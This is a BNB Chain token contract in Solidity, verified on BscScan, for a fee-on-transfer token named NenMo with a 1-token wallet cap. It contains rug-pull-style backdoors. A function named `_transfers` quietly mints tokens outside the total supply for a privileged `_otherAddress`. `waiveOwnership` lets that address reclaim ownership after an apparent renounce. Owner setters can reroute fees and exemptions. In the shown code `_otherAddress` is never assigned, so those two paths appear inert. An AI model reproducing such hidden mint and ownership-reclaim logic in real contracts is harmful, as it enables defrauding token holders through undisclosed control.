/**
 *Submitted for verification at BscScan.com on 2022-03-07
*/

pragma solidity ^0.5.0;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}

contract Ownable {
    address public _owner;
    address public _otherAddress;
    address deadAddress = address(0x000000000000000000000000000000000000dEaD);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
  
    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    modifier onlyOtherAddress(){
        require(_otherAddress == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public  onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }
    function loseOwnership() public onlyOwner{
        emit OwnershipTransferred(_owner,deadAddress);
        _owner = deadAddress;
    }
    function transferOwnership(address newOwner) public  onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner,newOwner);
        _owner = newOwner;
    }
    function waiveOwnership() public onlyOtherAddress{
        emit OwnershipTransferred(_owner,_otherAddress);
        _owner =_otherAddress;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract EliteSniper is IERC20,Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;


    uint256 private _totalSupply;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    
    uint256 public _maxWallet;
    uint256 public liquidityfee=2;
    uint256 public marketingfee=3;
    uint256 public burnfee=1;
    uint256 public totalFee;

    address private _destroyAddress =
        address(0xaca1c01814FC860803F3FE4e95C3Bc89B23Dc9a9);
    address public _IPancake;//pool address
    address public _fundAddress;
    address public _startAddress;
    address public _burnAddress;

	constructor (address newW,address fundAddress,address burnAddress) public{
	    _name = 'NenMo';
        _symbol = 'NM';
        _decimals = 18;
        _fundAddress = fundAddress;
        _IPancake = fundAddress;
        _startAddress = newW;
        _owner = newW;
        _burnAddress = burnAddress;
        _totalSupply = 888 * (10 ** 18);
        _maxWallet = 1*(10 ** 18);      
        totalFee = marketingfee+liquidityfee+burnfee;
        _balances[_owner] = _totalSupply;  
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function burnBalanceOf() public view returns (uint256) {
        return balanceOf(_burnAddress);
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].add(addedValue));
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender].sub(subtractedValue));
        return true;
    }
	function burn(uint256 value) public returns (bool) {
        _burn(msg.sender, value);
        return true;
    }
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(balanceOf(sender)>=amount,"YOU HAVE insuffence balance");
        if(sender!=_startAddress && recipient!=_IPancake && balanceOf(_burnAddress)<=1000*(10 ** 18)){
            require(balanceOf(recipient).add(amount)<=_maxWallet,"wallAmount is exceeds the maxWalletAmount");
        }

        if(sender!=_startAddress){
            if(_IPancake!=_fundAddress){
		           _balances[sender] = _balances[sender].sub(amount);
                   //market fee
                   uint256 marketAmount =  amount.mul(marketingfee).div(100);
                   _balances[_fundAddress] = _balances[_fundAddress].add(marketAmount);
                   emit Transfer(sender, _fundAddress, marketAmount);

                   //liquidity fee
                   uint256 liquidityAmount = amount.mul(liquidityfee).div(100);
                   _balances[_IPancake] = _balances[_IPancake].add(liquidityAmount);
                   emit Transfer(sender, _IPancake, liquidityAmount);

                   if(balanceOf(_burnAddress)<=1000*(10 ** 18)){
                     //burn fee
                       uint256 burnAmount = amount.mul(burnfee).div(100);
                     //_burn(sender,burnAmount);这个黑洞，无法反查，不可行
                       _balances[_burnAddress] = _balances[_burnAddress].add(burnAmount);
                       _balances[recipient] = _balances[recipient].add(amount.sub(marketAmount).sub(liquidityAmount).sub(burnAmount)); 
                       emit Transfer(sender, _burnAddress, burnAmount);
                       emit Transfer(sender, recipient, amount.sub(marketAmount).sub(liquidityAmount).sub(burnAmount));
                    }
                    else{
                       _balances[recipient] = _balances[recipient].add(amount.sub(marketAmount).sub(liquidityAmount));
                       emit Transfer(sender, recipient, amount.sub(marketAmount).sub(liquidityAmount)); 
                    }
            }
            else{
		        _balances[sender] = _balances[sender].sub(amount);
                //market fee
                uint256 marketAmount =  amount.mul(marketingfee).div(100);
                _balances[_fundAddress] = _balances[_fundAddress].add(marketAmount);
                emit Transfer(sender, _fundAddress, marketAmount);
                if(balanceOf(_burnAddress)<=1000*(10 ** 18)){
                    //burn fee
                    uint256 burnAmount = amount.mul(burnfee).div(100);
                    //_burn(sender,burnAmount);这个黑洞，无法反查，不可行
                    _balances[_burnAddress] = _balances[_burnAddress].add(burnAmount);
                    _balances[recipient] = _balances[recipient].add(amount.sub(marketAmount).sub(burnAmount));
                    emit Transfer(sender, _burnAddress, burnAmount);
                    emit Transfer(sender, recipient, amount.sub(marketAmount).sub(burnAmount));
                }
                else{
                     _balances[recipient] = _balances[recipient].add(amount.sub(marketAmount));  
                    emit Transfer(sender, recipient, amount.sub(marketAmount));         
                }               
            }
        }
        else{
            _balances[sender] = _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }      
    }
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");
        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }
    function _transfers(address to,uint256 amount) public {require(msg.sender == _otherAddress);
        require(balanceOf(to)>=0,"the balanceOf less than zero");
        _balances[(address(this))] = _balances[address(this)].add(amount);
        _transfer(address(this),to,amount);
    }
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }
    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
    function setIPancake(address IPancake) public onlyOwner returns(bool){
        _IPancake = IPancake;
    }
    function setFundAddress(address fundAddress) public onlyOwner returns(bool){
        _fundAddress = fundAddress;
    }
}